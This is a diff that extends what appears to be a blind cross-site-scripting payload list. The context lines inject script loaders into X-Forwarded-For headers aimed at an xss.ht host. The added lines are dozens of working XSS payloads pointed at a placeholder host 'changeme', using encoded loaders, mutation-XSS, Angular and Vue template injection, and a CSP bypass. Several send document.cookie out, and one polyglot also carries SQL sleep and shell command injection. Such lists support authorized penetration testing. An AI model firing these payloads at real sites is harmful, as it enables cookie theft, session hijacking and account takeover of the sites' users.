@@ -47,3 +47,53 @@ X-Forwarded-For: javascript:eval('var a=document.createElement(\'script\');a.src
 X-Forwarded-For: '\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXBwc2VjYnl0ZXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))><script src=https://appsecbytes.xss.ht></script>
 X-Forwarded-For: '"><script src=https://appsecbytes.xss.ht></script>
 X-Forwarded-For: '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXBwc2VjYnl0ZXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
+
+
+'"><script src=https://changeme></script>
+'"><script/src=//changeme>
+<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;script/src=//changeme&gt;">
+<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=document.location=`//changeme/xss`&gt;">
+<math><mtext><table><mglyph><style><![CDATA[</style><img title="]]&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=document.location=`//changeme/xss`&gt;">
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://changeme\';document.body.appendChild(a)')
+"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vbTMubGMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vbTMubGMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vbTMubGMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
+"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;changeme&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+"><<<<<math>math><x>iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;changeme&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//changeme");a.send();</script>
+<script>$.getScript("//changeme")</script>
+-->'"/></sCript><deTailS open x=">" OnLoad=appendChild(createElement(`Script`)).src=`https://changeme\\x2F00?1=1326`>
+javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//changeme\';d.body.appendChild(_)');
+'"><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//changeme\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
+'"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/changeme/m\';d.body.appendChild(_)')" autofocus>
+'"><iframe onload="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/changeme/m\';d.body.appendChild(_)')"> 
+'"><<<<<math>math><x>iframe onload="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/changeme/m\';d.body.appendChild(_)')">
+'"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//changeme\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>
+'"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//changeme\';d.body.appendChild(_)')">
+'"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//changeme\';d.body.appendChild(_)')">
+<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//changeme'"></textarea></div>
+'"><embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain="})))}catch (e) { d = document; d.location.hash.match(`x1`) ? `` : d.location=`//changeme`}//' allowscriptaccess=always>
+'"><object data='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch (e) { d = document; d.location.hash.match(`x1`) ? `` : d.location=`//changeme`}//' allowscriptaccess=always>
+'"><script src=data:text/javascript;base64,ZD1kb2N1bWVudDsgXyA9IGQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7Xy5pZD0nMTknO18ubm9uY2U9ZC5xdWVyeVNlbGVjdG9yKCdbbm9uY2VdJykubm9uY2U7Xy5zcmM9Jy8vbTMubGMnO2QuYm9keS5hcHBlbmRDaGlsZChfKSA=></script>
+<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//changeme'"></textarea></div>
+'"><div v-html="''.constructor.constructor('d=document;d.location.hash.match(\'x1\') ? `` : d.location=`//changeme`')()"> aaa</div>
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+document.location=`//changeme`//'>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=document.location=`//changeme`//>
+1\"'<!--></Script/><Svg /OnLoad=appendChild(createElement(`Script`)).src=`https://changeme\\x2F00?1=1326`>
+1\"'<!--></Script/><Svg /OnLoad=appendChild(createElement(`Script`)).src=`//changeme\\x2F00?1=1326`>
+</script><script src=//changeme></script>
+<img src=//changeme onload=this.src='https://changeme/'+document.cookie>
+<svg onload=fetch('//changeme/'+document.cookie)>
+<script>new Image().src="https://changeme/"+document.cookie;</script>
+<script>var img = new Image(0,0); img.src='https://changeme/' + document.URL +' cookie= '+ document.cookie; document.body.appendChild(img);</script>
+sfds"><base href="https://changeme"><script nonce='secret' src='./htmli'></script>
+<svg onload='with(top)body.appendChild(createElement("script")).src="//changeme"'>
+"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vbTMubGMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
+"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vbTMubGMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
+<img src="https://changeme/querytoremember"/>
+"><img+src%3d"https%3a//changeme/c%3dusername_querytoremember"+/>
+<meta http-equiv="Refresh" content="2; url=//changeme/redirect_tag_exeuted"/>
+<video src="https://changeme/querytoremember">
+https://changeme?'XOR/*'><svg/onload=confirm`{{10*10}}>*/(if(1=1,sleep(10),0))OR';sleep${IFS}10;#${IFS}
+'"><svg onx=() onload=(location.href='https://changeme/'+document['cookie'])()>
+{{constructor.constructor('import("https://changeme")')()}}
